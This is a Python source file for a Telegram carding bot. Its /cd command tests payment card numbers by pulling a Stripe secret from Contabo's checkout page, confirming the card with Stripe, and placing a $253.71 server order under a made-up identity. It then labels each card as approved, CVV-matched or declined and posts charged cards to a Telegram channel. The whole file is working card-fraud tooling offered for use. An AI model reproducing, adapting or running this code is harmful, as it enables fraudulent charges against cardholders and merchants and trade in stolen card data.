import requests
import time
import random
import json
import string
import re
from datetime import datetime
from random import choice

from pyrogram import Client
from pyrogram.types import Message

from carding.functions import *
from carding.database.checkuser_sql import already_added


@Client.on_message(cmd('cd'))
async def cd_func(client, message: Message):
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    #if user_id != 5032070399:
       #return await message.reply("**GATE MAINTENANCE!**")
    if is_spam(user_id):
        return await message.reply_text(text="**ANTISPAM!**\n`Wait in 5s and try again..`",reply_to_message_id=message.message_id)
    try:
        if already_added(user_id):
            pass
        elif not already_added(user_id):
            await message.reply_text(text="Please **register** 1st..\nSend /register to registered",reply_to_message_id=message.message_id)
            return
        query = ''
        for i in message.command[1:]:
            query += ' ' + str(i)
        if not query:
            await message.reply_text(text="**Input valid cc\nEx: `/cd cc|mm|yy|cvv`**",reply_to_message_id=message.message_id)
            return
        xx = await message.reply_text(text="**Checking your card..⏳**",reply_to_message_id=message.message_id)
        start_time = time.time()
        splitter = re.findall(r"[0-9]+", query)
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvc = splitter[3]
        strlenx = len(cc)
        cvvd = cvc[:3]
        cvvx = cvc[:4]
        bin = cc[:6]

        file = open('carding/temp/bin.txt', 'r').readlines() 
        if str(bin) + "\n" in file:
           await xx.edit_text("**BIN BANNED!**"
                                )
           return

        if (strlenx < 16):
            cvv = cvvx
        else:
            cvv = cvvd

        lista = cc + "|" + mes + "|" + ano + "|" + cvv

        res = requests.get("https://dragon-bin-api.vercel.app/api/" + bin)
        vendor = getStr(res.text, '"vendor":"', '"')
        bank = getStr(res.text, '"bank":"', '"')
        type = getStr(res.text, '"type":"', '"')
        country = getStr(res.text, '"country":"', '"')
        level = getStr(res.text, '"level":"', '"')
        flag = getStr(res.text, '"emoji":"', '"')
        # -----------[ If Not Respond ]----------------
        vendor = "Null" if not vendor else vendor
        bank = "Null" if not bank else bank
        type = "Null" if not type else type
        country = "Null" if not country else country
        level = "Null" if not level else level

        if cc.startswith('5'):
            xtype = 'mastercard'
        if cc.startswith('4'):
            xtype = 'visa'
        if cc.startswith('6'):
            xtype = 'discover'
        if cc.startswith('3'):
            xtype = 'american express'

        cc1 = cc[:4]
        cc2 = cc[4:-8]
        cc3 = cc[8:-4]
        clast = cc[-4:]
        s = requests.session()
#REQ1
        url = 'https://contabo.com/en/api/page-data/payment.json'
        headers = {
'Accept': '*/*',
'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'Connection': 'keep-alive',
'Host': 'contabo.com',
'Referer': 'https://contabo.com/en/checkout/payment/',
'Save-Data': 'on',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.94 Mobile Safari/537.36'
}
        res = s.get(url=url, headers=headers)
        secret = getStr(res.text,'"stripe_client_secret":"','_secret')
        cs = getStr(res.text,'"stripe_client_secret":"','"')

#REQ2
        url = 'https://api.stripe.com/v1/setup_intents/'+secret+'/confirm'
        data = 'payment_method_data[type]=card&payment_method_data[card][number]='+cc+'&payment_method_data[card][cvc]='+cvv+'&payment_method_data[card][exp_month]='+mes+'&payment_method_data[card][exp_year]='+ano+'&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[guid]=b9d01ffe-dd58-4c45-8916-1323840007a7acdd12&payment_method_data[muid]=f3e6d33f-15b4-43cf-93e9-824941c72dbf1c5348&payment_method_data[sid]=eba431b2-8392-4fff-82b9-c6dc937353547f3c27&payment_method_data[payment_user_agent]=stripe.js%2Fdca8db2fe%3B+stripe-js-v3%2Fdca8db2fe&payment_method_data[time_on_page]=48658&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HH2BIDecjLsXqEKPxG7aAFTODSe38BxMf9s7icV8Iw7YGP1yA5xRlApyqciUNRLJ0lLACi7Ih2gEchTgeG4QWDx00y2QL6xWD&client_secret='+cs+''
        headers = {
'authority': 'api.stripe.com',
'method': 'POST',
'path': '/v1/setup_intents/'+secret+'/confirm',
'scheme': 'https',
'accept': 'application/json',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://js.stripe.com',
'referer': 'https://js.stripe.com/',
'save-data': 'on',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.94 Mobile Safari/537.36'
}
        resp = s.post(url=url, data=data, headers=headers)

#REQ3
        url = 'https://contabo.com/en/api/checkout/order.json'
        # data = '{"order":{"cloud_enabled":false,"server_password":"QmVsaXRhbmcxNQ==","product_id":"V8","quantity":1,"contract_period":1,"location":"EU","currency":"USD","utm_source":"homepage","os_id":267,"prim_disk":"","addons":[],"heap_session_id":"","units":0,"scaling_limit":0},"user":{"salutation":"Mr","firstname":"Brian","lastname":"Adams","email":"xprojectsxd@gmail.com","street":"1st Avenue","zip":"10080","city":"New York","country":"US","telephone":"18786852722","user_type":"private","country_details":{"vat_rate_private":0,"vat_rate_company":0,"vat_verification":false,"vatRate":0,"name":"United States of America","cc":"US","currency":"USD"},"vat_validated":false,"language":"EN","currency":"USD","company":"","dob":"01.01.1970","vat_id":"","payment_details":{"method":"credit_card","payment_id":"'+secret+'","acc_holder":"","iban":"","skrill_email":"","card":{"last4":"'+clast+'","brand":"'+xtype+'","expiry":"'+mes+'/'+ano+'"}},"vatRate":0,"vatFraction":0},"method":"credit_card","details":{"paymentMethod":"credit_card","qty":1,"languageCode":"en","productTitle":"Cloud VDS S","productCategory":"vds","productId":"V8","transactionMrr":44.99}}'
        data = '{"order":{"cloud_enabled":false,"server_password":"QmVsaXRhbmcxNQ==","product_id":"V10","quantity":1,"contract_period":1,"location":"SIN","currency":"USD","utm_source":"homepage","os_id":307,"prim_disk":"","addons":[{"title":"Asia (Singapore)","id":"1397","quantity":1,"type":null,"value":"SIN","note":""},{"title":"Windows Server 2022 Standard","id":"1460","quantity":1,"type":null,"value":null,"note":""}],"heap_session_id":"","units":0,"scaling_limit":0},"user":{"salutation":"Mr","firstname":"Brian","lastname":"Adams","email":"ximfinexd@gmail.com","street":"1st Avenue","zip":"10080","city":"New York","country":"US","telephone":"18786375823","user_type":"private","country_details":{"vat_rate_private":0,"vat_rate_company":0,"vat_verification":false,"vatRate":0,"name":"United States of America","cc":"US","currency":"USD"},"vat_validated":false,"language":"EN","currency":"USD","company":"","dob":"01.01.1970","vat_id":"","payment_details":{"method":"credit_card","payment_id":"'+secret+'","acc_holder":"","iban":"","skrill_email":"","card":{"last4":"'+clast+'","brand":"'+xtype+'","expiry":"'+mes+'/'+ano+'"}},"vatRate":0,"vatFraction":0},"method":"credit_card","details":{"paymentMethod":"credit_card","qty":1,"languageCode":"en","productTitle":"Cloud VDS L","productCategory":"vds","productId":"V10","transactionMrr":173.73}}'
        headers = {
'Accept': '*/*',
'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'contabo.com',
'Origin': 'https://contabo.com',
'Referer': 'https://contabo.com/en/checkout/confirmation',
'Save-Data': 'on',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.94 Mobile Safari/537.36'
}
        res = s.post(url=url, data=data, headers=headers)
        message = getStr(res.text,'"stripe_error_code:','"]')
        amount = getStr(res.text,'"initial_amount":','",')
        oid = getStr(res.text,'"order_id":','"')
        code = getStr(res.text,'"decline_code": "','"')
        stop_time = time.time() - start_time
        date = datetime.today().strftime('%d-%m-%Y')
        oid = "null" if not oid else oid
        if '"initial_amount":253.71' in res.text or '"status": "succeeded"' in res.text:
            status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
            reson = "Charged 253$"
            saveCH(lista)
            await client.send_message(-1001745520470, f"""
<b>𝐆𝐀𝐓𝐄 𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 253$</b>
•━━━━━━━━━━━━━━━━━━━•
<code>{lista}</code>
╾──────────────────╼
<b>•𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> APPROVED ✅
<b>•𝗠𝗲𝘀𝘀𝗮𝗴𝗲:</b> Charged 253.71$ ✓
<b>•𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲:</b> {bank}
<b>•𝗖𝗮𝗿𝗱 𝗕𝗿𝗮𝗻𝗱:</b> {vendor}
<b>•𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:</b> {type} • {level}
<b>•𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {country} {flag}
•━━━━━━━━━━━━━━━━━━━•
<b>•𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> <a href="tg://user?id={user_id}">{name}</a>
<b>•𝐁𝐨𝐭 𝐁𝐲:</b> @xcardinglive
<b>•𝐓𝐢𝐦𝐞:</b> <code>{stop_time:.02f}s</code> [ {date} ]
""", parse_mode="HTML")
        elif 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'incorrect_cvc' in res.text or 'card zip code is incorrect' in res.text:
            status = "𝐂𝐂𝐍 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "INCORRECT CVC"
            saveCCN(lista)
        elif "insufficient_funds" in res.text or 'insufficient_funds' in resp.text:
            status = "𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Insuffcient Funds"
            saveCVV(lista)
        elif 'fraudulent' in resp.text:
            status = "𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Fraud Suspected"
            saveCVV(lista)
        elif 'stripe_error_code: authentication_required' in res.text:
            status = "𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Authentication_Required"
            saveCVV(lista)
        elif 'stripe_error_code: card_decline_rate_limit_exceeded' in res.text:
            status = "𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Rate_Limit_Exceeded"
            saveCVV(lista)
        elif 'requires_action' in resp.text:
            status = "𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Requires Action"
        elif 'stripe_error_code: expired_card' in res.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Expired Card"
        elif 'stripe_error_code: card_declined' in res.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "You card was declined"
        elif "invalid_cvc" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "invalid_cvc"
        elif "service_not_allowed" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Service_Not_Allowed"
        elif "card_not_supported" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "card_not_supported!"
        elif "lost_card" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Lost Card"
        elif "restricted_card" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Restricted_Card"
        elif "restricted_card" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Restricted_Card"
        elif "do_not_honor" in res.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Do Not Honor"
        elif "try_again_later" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Try_Again_Later"
        elif "pickup_card" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Pickup Card"
        elif "stolen_card" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "stolen_card"
        elif "exipred_card" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Exipred Card"
        elif "invalid_account" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Invalid_Account"
        elif "invalid_expiry_year" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Expired Card!"
        elif "invalid_pin" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "invalid_pin!"
        elif "sources_payment_method_not_available" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "sources_payment_method_not_available!"
        elif "invalid_expiry_month" in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Expired Card!"
        elif "Your card number is incorrect." in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Your card number is incorrect."
        elif "card number is incorrect" in resp.text or 'incorrect_number' in resp.text or 'Invalid Credit Card Number' in resp.text or 'card number is incorrect' in resp.text:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Incorrect_Number"
        else:
            status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = code

        lrespon = f"""
𝐆𝐀𝐓𝐄 𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 253$
•━━━━━━━━━━━━━━━━━━━•
<code>{lista}</code>
╾──────────────────╼
•𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {status}
•𝗠𝗲𝘀𝘀𝗮𝗴𝗲: {reson}
•𝗢𝗿𝗱𝗲𝗿 𝗜𝗗: {oid}
•𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲: {bank}
•𝗖𝗮𝗿𝗱 𝗕𝗿𝗮𝗻𝗱: {vendor} 
•𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲: {type} • {level}
•𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
•𝗧𝗼𝗼𝗸: <code>{stop_time:.02f}s</code> [ {date} ]
•━━━━━━━━━━━━━━━━━━━•
•𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={user_id}">{name}</a> [ {ustat(user_id)} ]
•𝐁𝐨𝐭 𝐁𝐲: <a href="https://t.me/X_DEVX">IM NOOB</a>
"""
        await xx.edit_text(lrespon, parse_mode="HTML")
    except Exception as e:
        print(e)
